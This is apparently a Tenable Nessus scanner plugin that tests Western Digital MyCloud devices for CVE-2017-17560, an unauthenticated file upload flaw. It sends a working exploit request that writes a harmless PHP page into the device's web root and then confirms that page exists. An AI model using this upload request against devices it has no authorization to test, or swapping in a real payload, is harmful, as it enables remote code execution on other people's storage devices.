#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(105732);
  script_version("1.5");
  script_cvs_date("Date: 2019/11/08");

  script_cve_id("CVE-2017-17560");

  script_name(english:"Western Digital MyCloud Unauthenticated File Upload");
  script_summary(english:"Uploads a file to the MyCloud device");

  script_set_attribute(attribute:"synopsis", value:
"The remote device is affected by a file upload vulnerability");
  script_set_attribute(attribute:"description", value:
"The remote WD MyCloud device is affected by a file upload vulnerability
that allows a remote attacker to upload and execute files.");
  # http://gulftech.org/advisories/WDMyCloud%20Multiple%20Vulnerabilities/125
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?d671658a");
  script_set_attribute(attribute:"see_also", value:"https://www.exploitee.rs/index.php/Western_Digital_MyCloud");
  script_set_attribute(attribute:"solution", value:
"Western Digital reported that they fixed this vulnerability in firmware
version 2.30.174. However, Tenable has confirmed that 2.30.174 does not
contain a fix.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Western Digital My Cloud File Upload");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Western Digital MyCloud multi_uploadify File Upload Vulnerability');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2017/11/16");
  script_set_attribute(attribute:"plugin_publication_date", value:"2018/01/10");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2018-2019 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("wd_mycloud_detect.nbin");
  script_require_keys("installed_sw/WD MyCloud");
  script_require_ports("Services/www", 80, 443, 8081);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

appname = "WD MyCloud";
get_install_count(app_name:appname, exit_if_zero:TRUE);
port = get_http_port(default:80, embedded:TRUE);
install = get_single_install(app_name:appname, port:port);

# generate the payload
name = SCRIPT_NAME - ".nasl" + "_" + unixtime();
upload = '--------------------------275ea22986aa6a17\r\n' +
         'Content-Disposition: form-data; name="Filedata[]"; filename="' + name + '.php"\r\n' +
         'Content-Type: application/octet-stream\r\n\r\n' +
         '<?php print("Hello from Nessus!"); ?>\r\n' +
         '--------------------------275ea22986aa6a17--\r\n';

# send the exploit
res = http_send_recv3(
  method:'POST',
  item:'/web/jquery/uploader/multi_uploadify.php?folder=/var/www/',
  port:port,
  content_type:'multipart/form-data; boundary=------------------------275ea22986aa6a17',
  data:upload,
  exit_on_fail:TRUE);

if (empty_or_null(res) || "302" >!< res[0])
{
  audit(AUDIT_DEVICE_NOT_VULN, "The " + install["model"]);
}

# get the page we created
res = http_send_recv3(method:'GET', item:'/' + name + '.php', port:port);
if (empty_or_null(res) || "200" >!< res[0] || "Hello from Nessus!" >!< res[2])
{
  audit(AUDIT_DEVICE_NOT_VULN, "The " + install["model"]);
}

file_location = build_url(qs:'/' + name + '.php', port:port);
report = 'Nessus created a new page at:\n\n' + file_location + '\n';
security_report_v4(port:port, severity:SECURITY_HOLE, extra:report);
